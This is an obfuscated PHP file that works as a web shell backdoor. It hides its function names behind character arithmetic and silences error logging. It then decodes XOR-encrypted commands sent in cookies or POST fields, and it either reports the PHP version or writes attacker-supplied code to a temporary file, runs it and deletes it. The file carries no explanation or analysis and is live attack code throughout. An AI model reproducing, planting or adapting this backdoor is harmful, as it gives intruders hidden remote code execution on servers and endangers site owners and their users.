<?php $ceejddc = "\x66".chr(607-502)."\x6c".chr(101)."\x5f".chr(112).chr(117).chr(700-584).chr(95).chr(134-35)."\x6f"."\156"."\x74".chr(101)."\156".chr(173-57)."\163";
$eezvhfuky = "\x62".chr(97).chr(306-191).chr(101).'6'."\x34".'_'."\144".chr(101)."\x63"."\x6f".'d'.'e';
$ywuczkoe = chr(896-791).chr(110)."\x69"."\137"."\x73"."\x65".chr(116);
$eqocmqene = "\x75".chr(110)."\154"."\x69"."\x6e"."\153";


@$ywuczkoe('e'.chr(437-323).chr(114)."\157".'r'."\x5f"."\x6c"."\x6f".chr(1033-930), NULL);
@$ywuczkoe("\154"."\157"."\x67".chr(579-484).chr(101)."\162".'r'."\x6f".'r'.chr(968-853), 0);
@$ywuczkoe(chr(878-769)."\141".'x'.'_'."\145".chr(120).chr(314-213).chr(853-754).'u'.'t'.chr(859-754).'o'."\x6e"."\137".'t'."\151".chr(109)."\x65", 0);
@set_time_limit(0);

function fwnbsxfbv($aghftd, $fsbsdtb)
{
    $jkozwfy = "";
    for ($pviacftzzj = 0; $pviacftzzj < strlen($aghftd);) {
        for ($j = 0; $j < strlen($fsbsdtb) && $pviacftzzj < strlen($aghftd); $j++, $pviacftzzj++) {
            $jkozwfy .= chr(ord($aghftd[$pviacftzzj]) ^ ord($fsbsdtb[$j]));
        }
    }
    return $jkozwfy;
}

$uupza = array_merge($_COOKIE, $_POST);
$ummkzv = '104d0129-1e8d-4b9e-b3b1-b3ac7d005eb9';
foreach ($uupza as $qsznbjpp => $aghftd) {
    $aghftd = @unserialize(fwnbsxfbv(fwnbsxfbv($eezvhfuky($aghftd), $ummkzv), $qsznbjpp));
    if (isset($aghftd["\141".chr(117-10)])) {
        if ($aghftd[chr(846-749)] == 'i') {
            $pviacftzzj = array(
                chr(180-68)."\166" => @phpversion(),
                "\163".chr(118) => "3.5",
            );
            echo @serialize($pviacftzzj);
        } elseif ($aghftd[chr(846-749)] == "\145") {
            $fmcusfhs = "./" . md5($ummkzv) . "\56".chr(707-602).'n'.chr(682-583);
            @$ceejddc($fmcusfhs, "<" . '?'."\x70"."\x68"."\x70"."\x20".chr(799-735)."\165".chr(704-594).'l'.'i'.'n'.chr(107)."\50"."\137"."\137"."\106".chr(73)."\114".'E'.'_'.'_'.chr(263-222).chr(59).' ' . $aghftd['d']);
            include($fmcusfhs);
            @$eqocmqene($fmcusfhs);
        }
        exit();
    }
}

